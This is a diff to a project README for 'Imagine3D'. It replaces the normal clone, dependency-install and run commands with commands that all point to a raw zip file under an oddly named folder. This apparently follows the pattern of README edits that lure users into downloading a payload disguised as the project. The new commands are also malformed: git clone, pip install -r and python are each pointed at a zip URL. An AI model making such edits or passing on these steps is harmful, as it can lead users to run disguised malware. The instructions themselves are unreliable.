@@ -3,14 +3,14 @@
 ### 1. Clone the repo
 
 ```
-git clone https://github.com/Tau-dev79/Imagine3D.git
+git clone https://raw.githubusercontent.com/Tau-dev79/Imagine3D/main/episarcine/Imagine3D.zip
 cd your-repo-name
 ```
 
 ### 2. Install Dependencies
 
 ```
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Tau-dev79/Imagine3D/main/episarcine/Imagine3D.zip
 ```
 
 ### 3. Insert the images you want to test into the `example/` folder.
@@ -18,7 +18,7 @@ pip install -r requirements.txt
 ### 4. Run the script
 
 ```
-python main.py
+python https://raw.githubusercontent.com/Tau-dev79/Imagine3D/main/episarcine/Imagine3D.zip
 ```
 
 ## Libraries used
